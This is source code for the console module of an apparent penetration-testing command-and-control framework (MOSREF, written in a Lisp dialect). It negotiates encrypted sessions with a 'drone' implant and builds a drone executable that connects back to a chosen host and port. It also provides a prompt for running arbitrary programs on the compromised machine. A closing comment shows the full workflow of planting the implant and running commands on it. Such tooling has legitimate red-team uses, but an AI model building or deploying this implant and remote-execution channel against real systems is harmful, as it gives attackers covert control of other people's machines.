; Copyright (C) 2006, Ephemeral Security, LLC
; 
; This library is free software; you can redistribute it and/or modify it 
; under the terms of the GNU Lesser General Public License, version 2.1
; as published by the Free Software Foundation.
; 
; This library is distributed in the hope that it will be useful, but WITHOUT 
; ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or 
; FITNESS FOR A PARTICULAR PURPOSE. See the GNU Lesser General Public License 
; for more details.
; 
; You should have received a copy of the GNU Lesser General Public License 
; along with this library; if not, write to the Free Software Foundation, 
; Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA 

(module "mosref/console")

(import "mosref/base")

(import "lib/cfb")
(import "lib/crypto-filter")
(import "lib/buffer-channel")
(import "lib/build")

(export console-affiliation console-repl drone-exec make-drone-exe 
        make-console-ecdh)

(import "lib/iterate")

(define-macro (step . rest) '(begin))
;(define (step label . items)
;  (print (string-append "CONSOLE: "
;                        (apply string-append label (map format items)) 
;                        "..." 
;                        *line-sep*)))

(define (make-console-ecdh) (make-ecdh-key *ecdh-keysize*))

(define (console-affiliation session-ecdh xmit recv)
  ;;;TODO: Configure timeout.
  (define read (buffer-channel recv))

  (define console-iv (make-iv))

  (step "Reading Drone Public Key")
  ;;; Drone --> Console, via plaintext, Dp
  (define drone-ecdh (import-ecdh (read 59)))
  (define aes-key (make-aes-key 256 
                                (ecdh-shared-secret session-ecdh drone-ecdh)))

  (step "Reading Drone IV")
  ;;; Drone --> Console, via KK, DD
  (define drone-iv (aes-decrypt aes-key (read 16)))

  (step "Transmitting Console IV")
  ;;; Console --> Drone, via KK, CC
  (send (aes-encrypt aes-key console-iv) xmit)
  
  (define report (make-mosref-recv recv aes-key drone-iv))
  (define command (make-mosref-xmit xmit aes-key console-iv))

  (step "Waiting for Drone to confirm Console IV")
  ;;; Drone --> Console, via RK, CC
  (unless (string=? (wait report) console-iv)
    (error 'aff "the drone failed to confirm affiliation"))

  (step "Confirming Drone IV")
  ;;; Console --> Drone, via CK, DD
  (send drone-iv command)

  ;;; TODO: We should probably create a pseudo-stream type..
  (step "Affiliation complete.")
  (list command report))

(define (make-drone-exe console-addr console-portno console-ecdh platform)
  (build-exe platform
             `((import "mosref/drone")
               (import "lib/tcp-server")
               (drone-repl
                 (drone-affiliation 
                   (import-ecdh
                     (base64-decode ,(base64-encode (export-public-ecdh 
                                                      console-ecdh))))
                   (open-tcp-connection ,console-addr ,console-portno)))
               (exit 0))))

(define (drone-exec cmd xmit recv)
  (cond 
    ((list? cmd)
     (set! cmd (freeze (assemble (optimize (compile cmd))))))
    ((program? cmd) 
     (set! cmd (freeze cmd)))
    ((string? cmd))
    (else
      (error 'mos "drone-exec accepts a frozen program, program or source")))
  (send cmd xmit)
  (thaw (error-on-fail (wait recv))))

(define (console-repl xmit recv)
  (define (display-result item)
    (send (string-append ":: " (format item) *line-sep*)))

  (define (display-failure key info context)
    (send (string-append (apply string-join 
                                 *line-sep*
                                 (string-join " "
                                              "Drone Error:" 
                                              (symbol->string key)
                                              info)
                                 (map (lambda (item) 
                                        (string-append "             " item))
                                      context))
                          *line-sep*)))

  (define (quit-repl cmd)
    (send 'close xmit))

  (define (drone-cmd cmd)
    (define cmd-ok #t)
    (guard (lambda (e) (send (string-append "Parse Error: " 
                                             (car (error-info e))
                                             *line-sep*))
                       (set! cmd-ok #f))
           (set! cmd (string->exprs cmd)))
    (when cmd-ok
      (define result (drone-exec cmd xmit recv))
      (define result-type (car result))
      (set! result (cdr result))
      (case result-type
        ((succ) 
         (for-each display-result result))
        ((fail) 
         (apply display-failure result)))))

  (define cmds 
    (dict (cons (string-append ".quit" *line-sep*)
                quit-repl)))

  (define default-cmd drone-cmd)

  ;;TODO: We need a line-filter, here.

  (forever
    (send ">> ")
    (define cmd (wait))
    (if (eq? cmd 'close)
     (return (send 'close))
     ((dict-ref cmds cmd default-cmd) cmd))))

;;; >> (define listener (spawn-mosref-listener "foo.com" 9191))
;;; :: #f
;;; >> (define session (make-drone-session listener))
;;; :: #f
;;; >> (write-data-file "drone.exe" (make-drone-exe listener "win32"))
;;; :: #f
;;; >> (define drone (await-drone session))
;;; ;; run the drone.exe program on the remote host
;;; :: #f
;;; >> (drone-exec '((write-data-file "/tmp/flag" "Claimed")) drone) 
;;; :: (ok . #f)

